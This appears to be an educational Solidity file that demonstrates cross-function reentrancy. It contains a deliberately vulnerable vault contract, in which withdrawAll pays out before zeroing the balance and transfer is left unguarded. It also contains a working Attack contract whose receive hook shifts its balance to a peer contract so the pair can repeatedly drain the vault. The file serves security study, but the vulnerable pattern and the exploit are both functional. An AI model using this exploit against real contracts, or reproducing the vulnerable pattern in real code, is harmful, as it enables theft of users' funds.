// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}



contract InsecureEtherVault is ReentrancyGuard {
    mapping (address => uint256) private userBalances;

    function deposit() external payable {
        userBalances[msg.sender] += msg.value;
    }


    //AQUI ESTA A VULNERABILITY
    function transfer(address _to, uint256 _amount) external {
        if (userBalances[msg.sender] >= _amount) {
           userBalances[_to] += _amount;
           userBalances[msg.sender] -= _amount;
        }
    }

    function withdrawAll() external noReentrant {  // Apply the noReentrant modifier
        uint256 balance = getUserBalance(msg.sender);
        require(balance > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        userBalances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return userBalances[_user];
    }
}


interface IEtherVault {
    function deposit() external payable;
    function transfer(address _to, uint256 _amount) external;
    function withdrawAll() external;
    function getUserBalance(address _user) external view returns (uint256);
} 

contract Attack {
    IEtherVault public immutable etherVault;
    Attack public attackPeer;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.transfer(
                address(attackPeer), 
                etherVault.getUserBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}